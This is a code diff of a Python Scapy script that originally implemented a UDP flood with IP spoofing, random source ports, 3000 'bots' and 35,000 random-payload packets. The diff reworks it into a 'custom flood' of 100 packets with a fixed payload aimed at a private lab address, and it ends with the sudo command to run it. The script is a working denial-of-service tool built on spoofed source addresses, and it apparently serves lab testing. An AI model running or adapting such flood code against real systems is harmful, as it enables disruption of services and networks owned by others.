@@ -5,20 +5,13 @@ import time
 import sys
 import ipaddress
 
-# Ataque simples UDP Flood, com tamanho do payload aleatório e
-# string aleatória como carga.
-# IP Spoofing, RandomSRCPort e 3000 bots.
-
-# CONFIGURAÇÃO DO ATAQUE
+# UDP Custom Payload
 TARGET_IP = "192.168.100.2"
 TARGET_PORT = 50001
-BOTFILE = "bots.txt"
-PACKET_PAYLOAD_MIN_SIZE = 64
-PACKET_PAYLOAD_MAX_SIZE = 512
-SEND_INTERVAL = 0.001
+BOTFILE = "../bots.txt"
+NUM_PACKETS = 100
 
 def load_bots(filename):
-    """Colocar os bots do arquivo em uma lista."""
     bot_ips = []
 
     with open(filename, "r") as f:
@@ -30,8 +23,7 @@ def load_bots(filename):
 
     return bot_ips
 
-def run_udp_flood_attack():
-    """UDP Flood Attack"""
+def run_udp_custom_flood():
     bot_ips = load_bots(BOTFILE)
 
     numero_de_pacotes_enviados = 0
@@ -45,19 +37,14 @@ def run_udp_flood_attack():
         eth_layer = Ether()
         udp_layer = UDP(sport=RandShort(), dport=TARGET_PORT)
 
-        paylaod_size = random.randint(PACKET_PAYLOAD_MIN_SIZE, PACKET_PAYLOAD_MAX_SIZE)
-        payload = RandString(size=paylaod_size)
+        payload = b'BananasInPyjamas'
 
-        packet = eth_layer / ip_layer / udp_layer / Raw(load=RandString(size=paylaod_size))
-        #print(f"Pacote {numero_de_pacotes_enviados + 1} (Sumário): {packet.summary()}")
-
-        #print(f"Pacote {numero_de_pacotes_enviados + 1} (Show2 - como seria enviado):")
-        #packet.show2()
+        packet = eth_layer / ip_layer / udp_layer / Raw(load=payload)
 
         lista_de_pacotes.append(packet)
         numero_de_pacotes_enviados += 1
 
-        if(numero_de_pacotes_enviados == 35000):
+        if(numero_de_pacotes_enviados == NUM_PACKETS):
             break
 
 
@@ -66,10 +53,12 @@ def run_udp_flood_attack():
     end_time = time.perf_counter()
     duration = end_time - start_time
 
-    print(f"\nEnvio concluído.")
-    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")
+    print(f"\nSending completed.")
+    print(f"Total time to send packets: {duration:.4f} seconds")
 
 
 
 if __name__ == "__main__":
-    run_udp_flood_attack()
+    run_udp_custom_flood()
+
+# sudo PYTHONPATH=$HOME/scapy python3 udp_custom_payload.py
